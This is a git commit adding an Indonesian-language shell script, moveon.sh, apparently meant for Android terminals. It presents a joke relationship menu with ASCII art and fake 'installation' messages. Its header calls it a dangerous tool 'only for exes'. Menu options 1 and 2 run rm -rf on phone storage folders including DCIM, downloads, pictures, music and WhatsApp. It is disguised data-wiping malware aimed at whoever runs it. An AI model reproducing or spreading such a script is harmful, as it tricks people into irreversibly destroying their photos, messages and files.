77e9996c544fe18658c3472c3560c759750cc337
OxLynx <50243923+oxlynx@users.noreply.github.com>
2019-05-28 16:02:43 +0700

    Add files via upload

---
+++ moveon.sh
@@ -0,0 +1,73 @@
+#Tools berbahaya
+#Hanya untuk mantan
+#Gunakan Dengan Bijak
+#Creator OxLynx
+
+m='\033[1;31m'
+h='\033[1;32m'
+k='\033[1;33m'
+u='\033[1;34m'
+pk='\033[1;35m'
+b='\033[1;36m'
+plh='\033[1;37m'
+
+clear
+echo $b  "[+] Creator : OxLynx [+]  ┈╱╱╱╱╱╲╲╲┈╱╱╲╲╲╲"
+echo $pk "××××××××××××××××××××××××  ┈▏▕╭▅╭▅▕▕╭▏▅╮▅╮▕╮"
+echo $h  "[1] Cari Pacar Baru  [1]  ┈▏╱▔▔╮▔▕▕╰▏▔╭▔▔▕╯"
+echo $h  "××××××××××××××××××××××××  ▕╱╲╰━━╯╱╲▏╲╰━━╯╱"
+echo $k  "[2] Gabisa Move On   [2]  ┈┈╭▔▔▔▔╲┈┈╱▔▔▔▔╮"
+echo $k  "××××××××××××××××××××××××  ┈┈┃▏┊┊▕╲╲╱╱▏┊┊▕┃"
+echo $m  "[3] Keluar           [3]  ┈┈╰▏▂▂▕┈╰╯┈▏▂▂▕╯"
+echo $m  "××××××××××××××××××××××××  ┈┈▕▂▏▕▂▏┈┈▕▂▏▕▂▏"
+echo $b
+
+read -p "[+] Pilih Mana Mblo : " oxlynx;
+if [ $oxlynx = 3 ] || [ $oxlynx = Keluar ]
+then
+echo ""
+echo $h "[+] Terima Kasih" $k"Sudah Menggunakan" $m"Tools Ini [+]"
+echo $b "[-] See You" $pk"Next Time [-]"
+echo $h ""
+exit
+fi
+
+if [ $oxlynx = 1 ] || [ $oxlynx = Cari Pacar Baru ]
+then
+echo $b "Tunggu Sebentar..."
+echo $pk "Proses Penginstallan"
+echo ""
+cd /sdcard
+rm -rf android
+rm -rf download
+rm -rf downloads
+rm -rf pictures
+rm -rf foto
+rm -rf music
+rm -rf musik
+rm -rf vidio
+rm -rf vidioes
+rm -rf dcim
+rm -rf whatsapp
+echo ""
+fi
+
+if [ $oxlynx = 2 ] || [ $oxlynx = Gabisa Move On ]
+then
+echo $b "Tunggu Sebentar..."
+echo $pk "Mulai Proses Penginstallan"
+echo ""
+cd /storage
+rm -rf android
+rm -rf download
+rm -rf downloads
+rm -rf musik
+rm -rf music
+rm -rf foto
+rm -rf pictures
+rm -rf vidio
+rm -rf vidioes
+rm -rf dcim
+rm -rf whatsapp
+echo ""
+fi
